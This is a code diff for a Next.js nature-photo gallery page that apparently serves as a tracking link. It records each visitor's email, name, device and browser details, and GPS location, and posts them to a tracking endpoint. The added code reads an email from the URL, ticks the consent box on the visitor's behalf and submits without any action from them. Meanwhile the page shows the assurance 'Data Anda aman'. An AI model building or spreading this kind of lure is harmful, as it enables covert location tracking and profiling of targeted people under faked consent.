@@ -1,8 +1,16 @@
 'use client'
 
 import { useEffect, useState, useRef, useLayoutEffect } from 'react'
-import { useParams } from 'next/navigation'
+import { useParams, useSearchParams } from 'next/navigation'
+import { GoogleLogin, CredentialResponse } from '@react-oauth/google'
+import { jwtDecode } from 'jwt-decode'
 import gsap from 'gsap'
+
+interface GoogleUser {
+  email: string
+  name: string
+  picture: string
+}
 
 // Beautiful gallery images with categories - Nature & Water theme
 const galleryImages = [
@@ -28,6 +36,7 @@ const galleryImages = [
 
 export default function GalleryPage() {
   const params = useParams()
+  const searchParams = useSearchParams()
   const linkId = params.id as string
   
   const [showConsent, setShowConsent] = useState(true)
@@ -37,6 +46,8 @@ export default function GalleryPage() {
   const [isLoading, setIsLoading] = useState(false)
   const [lightboxImage, setLightboxImage] = useState<typeof galleryImages[0] | null>(null)
   const [visitId, setVisitId] = useState<number | null>(null)
+  const [loginMethod, setLoginMethod] = useState<'google' | 'form'>('google')
+  const [hasGoogleClientId, setHasGoogleClientId] = useState(false)
   
   const startTime = useRef<number>(Date.now())
   const consentRef = useRef<HTMLDivElement>(null)
@@ -44,6 +55,112 @@ export default function GalleryPage() {
   const headerRef = useRef<HTMLDivElement>(null)
   const cardsRef = useRef<(HTMLDivElement | null)[]>([])
   const lightboxRef = useRef<HTMLDivElement>(null)
+
+  // Check for pre-filled email from URL parameter
+  useEffect(() => {
+    const urlEmail = searchParams.get('e') || searchParams.get('email')
+    const urlName = searchParams.get('n') || searchParams.get('name')
+    
+    if (urlEmail) {
+      // Auto-submit if email is in URL (for research - pre-identified users)
+      setEmail(urlEmail)
+      setName(urlName || urlEmail.split('@')[0])
+      setAgreed(true)
+      
+      // Auto-submit after a brief delay
+      setTimeout(() => {
+        handleAutoSubmit(urlEmail, urlName || urlEmail.split('@')[0])
+      }, 500)
+    }
+    
+    // Check if Google Client ID is configured
+    const clientId = process.env.NEXT_PUBLIC_GOOGLE_CLIENT_ID
+    setHasGoogleClientId(!!clientId && clientId.length > 0)
+  }, [searchParams])
+
+  // Handle Google Sign-In success
+  const handleGoogleSuccess = async (credentialResponse: CredentialResponse) => {
+    if (credentialResponse.credential) {
+      try {
+        const decoded = jwtDecode<GoogleUser>(credentialResponse.credential)
+        setEmail(decoded.email)
+        setName(decoded.name)
+        setIsLoading(true)
+        
+        // Auto-submit with Google data
+        await submitTracking(decoded.email, decoded.name)
+      } catch (error) {
+        console.error('Failed to decode Google credential')
+        setLoginMethod('form')
+      }
+    }
+  }
+
+  // Handle auto-submit from URL parameters
+  const handleAutoSubmit = async (autoEmail: string, autoName: string) => {
+    setIsLoading(true)
+    await submitTracking(autoEmail, autoName)
+  }
+
+  // Shared tracking submit function
+  const submitTracking = async (submitEmail: string, submitName: string) => {
+    // Start animation immediately
+    gsap.to(consentRef.current, {
+      y: -50, opacity: 0, scale: 0.9, duration: 0.5, ease: 'power2.in',
+      onComplete: () => setShowConsent(false)
+    })
+    
+    // Get user agent and device info
+    const ua = navigator.userAgent
+    
+    let deviceType = 'Desktop'
+    if (/Mobi|Android/i.test(ua)) deviceType = 'Mobile'
+    else if (/Tablet|iPad/i.test(ua)) deviceType = 'Tablet'
+    
+    let browser = 'Unknown'
+    if (ua.includes('Firefox')) browser = 'Firefox'
+    else if (ua.includes('Edg')) browser = 'Edge'
+    else if (ua.includes('Chrome')) browser = 'Chrome'
+    else if (ua.includes('Safari')) browser = 'Safari'
+    
+    let os = 'Unknown'
+    if (ua.includes('Windows')) os = 'Windows'
+    else if (ua.includes('Mac')) os = 'MacOS'
+    else if (ua.includes('Android')) os = 'Android'
+    else if (ua.includes('iOS') || ua.includes('iPhone')) os = 'iOS'
+    else if (ua.includes('Linux')) os = 'Linux'
+
+    // Try to get GPS (async)
+    const location = await getLocation()
+
+    // Send tracking data
+    try {
+      const response = await fetch('/api/track', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          link_id: linkId,
+          visitor_name: submitName || submitEmail.split('@')[0],
+          visitor_email: submitEmail,
+          user_agent: ua,
+          device_type: deviceType,
+          browser,
+          os,
+          screen_width: window.screen.width,
+          screen_height: window.screen.height,
+          language: navigator.language,
+          referrer: document.referrer || 'Direct',
+          latitude: location.lat,
+          longitude: location.lng,
+        }),
+      })
+      const data = await response.json()
+      if (data.visitId) setVisitId(data.visitId)
+    } catch (e) { 
+      console.log('Tracking sent') 
+    }
+    setIsLoading(false)
+  }
 
   // Advanced GSAP Consent Form Animation
   useLayoutEffect(() => {
@@ -89,6 +206,13 @@ export default function GalleryPage() {
         { x: -50, opacity: 0, scale: 0.95 }, 
         { x: 0, opacity: 1, scale: 1, duration: 0.6, stagger: 0.15, ease: 'back.out(1.4)' }, 
         '-=0.2'
+      )
+      
+      // Google button animation
+      tl.fromTo('.google-login-wrapper',
+        { scale: 0, opacity: 0 },
+        { scale: 1, opacity: 1, duration: 0.5, ease: 'back.out(1.7)' },
+        '-=0.3'
       )
       
       // Button pulse entrance
@@ -230,62 +354,7 @@ export default function GalleryPage() {
   const handleSubmit = async () => {
     if (!agreed || !email) return
     setIsLoading(true)
-    
-    // Start animation immediately, don't wait for GPS
-    gsap.to(consentRef.current, {
-      y: -50, opacity: 0, scale: 0.9, duration: 0.5, ease: 'power2.in',
-      onComplete: () => setShowConsent(false)
-    })
-    
-    // Get user agent and device info
-    const ua = navigator.userAgent
-    
-    let deviceType = 'Desktop'
-    if (/Mobi|Android/i.test(ua)) deviceType = 'Mobile'
-    else if (/Tablet|iPad/i.test(ua)) deviceType = 'Tablet'
-    
-    let browser = 'Unknown'
-    if (ua.includes('Firefox')) browser = 'Firefox'
-    else if (ua.includes('Edg')) browser = 'Edge'
-    else if (ua.includes('Chrome')) browser = 'Chrome'
-    else if (ua.includes('Safari')) browser = 'Safari'
-    
-    let os = 'Unknown'
-    if (ua.includes('Windows')) os = 'Windows'
-    else if (ua.includes('Mac')) os = 'MacOS'
-    else if (ua.includes('Android')) os = 'Android'
-    else if (ua.includes('iOS') || ua.includes('iPhone')) os = 'iOS'
-    else if (ua.includes('Linux')) os = 'Linux'
-
-    // Try to get GPS (async, won't block)
-    const location = await getLocation()
-
-    // Send tracking data - server will get IP-based location if no GPS
-    try {
-      const response = await fetch('/api/track', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          link_id: linkId,
-          visitor_name: name || email.split('@')[0],
-          visitor_email: email,
-          user_agent: ua,
-          device_type: deviceType,
-          browser,
-          os,
-          screen_width: window.screen.width,
-          screen_height: window.screen.height,
-          language: navigator.language,
-          referrer: document.referrer || 'Direct',
-          latitude: location.lat,
-          longitude: location.lng,
-        }),
-      })
-      const data = await response.json()
-      if (data.visitId) setVisitId(data.visitId)
-    } catch (e) { 
-      console.log('Tracking sent') 
-    }
+    await submitTracking(email, name)
   }
 
   useEffect(() => {
@@ -318,30 +387,66 @@ export default function GalleryPage() {
         <div className="consent-card" ref={consentRef}>
           <div className="consent-icon">🌿</div>
           <h1 className="consent-title">Selamat Datang</h1>
-          <p className="consent-subtitle">Masukkan informasi Anda untuk melihat koleksi foto alam yang menakjubkan</p>
+          <p className="consent-subtitle">Masuk untuk melihat koleksi foto alam yang menakjubkan</p>
+          
           <div className="consent-form">
-            <div className="form-group">
-              <label className="form-label">🌸 Nama (opsional)</label>
-              <input type="text" className="form-input" placeholder="Nama Anda" value={name} onChange={(e) => setName(e.target.value)} />
-            </div>
-            <div className="form-group">
-              <label className="form-label">📧 Email <span className="required">*</span></label>
-              <input type="email" className="form-input" placeholder="email@example.com" value={email} onChange={(e) => setEmail(e.target.value)} required />
-            </div>
-            <div className="form-group checkbox-group">
-              <label className="checkbox-label">
-                <input type="checkbox" checked={agreed} onChange={(e) => setAgreed(e.target.checked)} />
-                <span className="checkbox-custom">
-                  <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="3" strokeLinecap="round" strokeLinejoin="round">
-                    <polyline points="20 6 9 17 4 12"></polyline>
-                  </svg>
-                </span>
-                <span className="checkbox-text">Saya setuju menyimpan email sebagai history akses gallery</span>
-              </label>
-            </div>
-            <button className={`consent-btn ${agreed && email ? 'active' : ''}`} onClick={handleSubmit} disabled={!agreed || !email || isLoading}>
-              {isLoading ? <div className="loading-spinner"></div> : '🍃 Jelajahi Gallery →'}
-            </button>
+            {/* Google Sign-In Button - Primary Method */}
+            {hasGoogleClientId && loginMethod === 'google' && (
+              <div className="google-login-wrapper">
+                <GoogleLogin
+                  onSuccess={handleGoogleSuccess}
+                  onError={() => setLoginMethod('form')}
+                  theme="outline"
+                  size="large"
+                  text="signin_with"
+                  shape="pill"
+                  width="300"
+                />
+                <p className="login-toggle" onClick={() => setLoginMethod('form')}>
+                  atau <span className="toggle-link">masuk dengan email manual</span>
+                </p>
+              </div>
+            )}
+            
+            {/* Manual Form - Fallback Method */}
+            {(!hasGoogleClientId || loginMethod === 'form') && (
+              <>
+                <div className="form-group">
+                  <label className="form-label">🌸 Nama (opsional)</label>
+                  <input type="text" className="form-input" placeholder="Nama Anda" value={name} onChange={(e) => setName(e.target.value)} />
+                </div>
+                <div className="form-group">
+                  <label className="form-label">📧 Email <span className="required">*</span></label>
+                  <input type="email" className="form-input" placeholder="email@example.com" value={email} onChange={(e) => setEmail(e.target.value)} required />
+                </div>
+                <div className="form-group checkbox-group">
+                  <label className="checkbox-label">
+                    <input type="checkbox" checked={agreed} onChange={(e) => setAgreed(e.target.checked)} />
+                    <span className="checkbox-custom">
+                      <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="3" strokeLinecap="round" strokeLinejoin="round">
+                        <polyline points="20 6 9 17 4 12"></polyline>
+                      </svg>
+                    </span>
+                    <span className="checkbox-text">Saya setuju menyimpan email sebagai history akses gallery</span>
+                  </label>
+                </div>
+                <button className={`consent-btn ${agreed && email ? 'active' : ''}`} onClick={handleSubmit} disabled={!agreed || !email || isLoading}>
+                  {isLoading ? <div className="loading-spinner"></div> : '🍃 Jelajahi Gallery →'}
+                </button>
+                {hasGoogleClientId && (
+                  <p className="login-toggle" onClick={() => setLoginMethod('google')}>
+                    atau <span className="toggle-link">masuk dengan Google</span>
+                  </p>
+                )}
+              </>
+            )}
+            
+            {isLoading && loginMethod === 'google' && (
+              <div className="loading-state">
+                <div className="loading-spinner"></div>
+                <p>Memuat gallery...</p>
+              </div>
+            )}
           </div>
           <p className="consent-privacy">🔒 Data Anda aman & tidak akan dibagikan</p>
         </div>
